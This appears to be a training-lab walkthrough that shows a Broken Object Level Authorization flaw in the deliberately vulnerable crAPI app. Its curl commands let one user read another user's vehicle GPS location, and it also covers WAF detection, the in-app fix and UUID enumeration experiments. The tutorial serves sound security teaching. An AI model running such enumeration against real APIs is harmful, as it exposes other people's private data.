# 01 — crAPI BOLA (Broken Object Level Authorization)

**Vulnerability class:** [OWASP API1:2023 — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/).

An authenticated user requests another user's vehicle record by guessing
or enumerating its UUID. crAPI's workshop service verifies the caller's
JWT but does not verify that the vehicle belongs to the caller.

## Setup

```bash
task crapi:seed       # creates user1/2/3 @lab.local
task test             # confirm endpoints are healthy
```

## Baseline: attack succeeds (WAF off)

### Step 1 — Log in as user1, capture JWT

```bash
HOST_IP=$(grep ^LAB_HOST_IP lab.env | cut -d= -f2)
DOMAIN=$(grep ^LAB_DOMAIN   lab.env | cut -d= -f2)

TOKEN_1=$(curl -sk -X POST \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  "https://crapi.${DOMAIN}/identity/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"user1@lab.local","password":"Passw0rd!"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')

echo "${TOKEN_1:0:40}..."
```

Expected: a JWT (40+ characters, three `.`-separated segments).

### Step 2 — Claim user1's vehicle (normal flow)

```bash
# Get the activation code that ships via MailHog (crAPI emails it on signup)
task crapi:mail   # opens http://localhost:8025 in your terminal -- note the code

# Claim the vehicle with it
curl -sk -X POST \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  -H "Authorization: Bearer ${TOKEN_1}" \
  -H 'Content-Type: application/json' \
  "https://crapi.${DOMAIN}/identity/api/v2/vehicle/add_vehicle" \
  -d '{"vin":"0BOLABOLABOLA0001","pincode":"1234"}'

# List user1's vehicles -- capture the first vehicle's UUID
VEHICLE_UUID=$(curl -sk \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  -H "Authorization: Bearer ${TOKEN_1}" \
  "https://crapi.${DOMAIN}/identity/api/v2/vehicle/vehicles" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)[0]["uuid"])')

echo "user1 vehicle UUID: $VEHICLE_UUID"
```

### Step 3 — Log in as user2, access user1's vehicle location

```bash
TOKEN_2=$(curl -sk -X POST \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  "https://crapi.${DOMAIN}/identity/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"user2@lab.local","password":"Passw0rd!"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')

# user2 asks for user1's vehicle location
curl -sk \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  -H "Authorization: Bearer ${TOKEN_2}" \
  "https://crapi.${DOMAIN}/identity/api/v2/vehicle/${VEHICLE_UUID}/location" \
  | python3 -m json.tool
```

**Expected (attack succeeds):**

```json
{
  "carId": "<user1's UUID>",
  "vehicleLocation": {
    "id": 1,
    "latitude": "37.22999",
    "longitude": "-80.41775"
  },
  "fullName": "User One"
}
```

user2 just learned user1's car's GPS coordinates. The JWT was valid, the
URL was well-formed, and the app never checked whether the vehicle
actually belongs to user2.

## Observability

**Grafana panel:** *Total Request Rate* (OSS dashboard) shows a single
request blip when you run step 3 — the BOLA itself is low-volume.
This scenario is about **response contents**, not traffic shape.

**Log tail (`task logs:nginx`):**

```
<user2-ip> - - [..] "GET /identity/api/v2/vehicle/<uuid>/location HTTP/1.1" 200 ...
```

The 200 is the "attack succeeded" signal. From NGINX's vantage point,
this is an ordinary authenticated request — the vulnerability is purely
in the app's authorization logic.

## Protected: attack blocked (`task waf-on`)

### On NGINX Plus

```bash
task waf-on
# re-run step 3
```

The [App Protect OWASP policy](../../policies/ap-policy-owasp.yaml) ships
with a **Data Guard** rule that masks sensitive data in responses.
Latitude/longitude won't pass through cleanly — you'll see either an
HTTP 403 block or a response with the coordinates redacted, depending
on the policy's enforcement mode.

`task logs:waf` will show:

```
support_id="..." policy_name="/nginx-ingress/owasp-crs" outcome="REJECTED"
violations="VIOL_DATA_GUARD"
```

### On OSS (shadow mode)

`task waf-on` applies the overlay but App Protect is not installed.
The attack still succeeds. This is expected — OSS demonstrates the
**overlay switching mechanism**, not enforcement. The dashboard and
logs look identical to the baseline.

**To mitigate on OSS:** BOLA is fundamentally an authorization bug, not
a payload problem. A WAF can hide *symptoms* (data leakage via Data
Guard) but the real fix is in-app: the workshop service must verify
`request.user.id == vehicle.owner_id` before returning location data.
No WAF substitutes for that.

## Real-world correlate

- **Uber 2016:** a BOLA in their driver API allowed arbitrary account
  takeover via UUID enumeration.
- **USPS Informed Visibility 2018:** 60 million user records exposed
  because UUIDs were guessable and no per-request authorization ran.

## Further experiments

- Use [Locust](../../jobs/locust-job.yaml)'s existing user-list to
  repeat step 3 against every known UUID — demonstrates at-scale
  enumeration.
- Try the same pattern against `/workshop/api/shop/orders/<order_id>`
  — orders are also vulnerable.
- Compare response times for valid-vs-invalid UUIDs; crAPI's timing
  can leak existence.
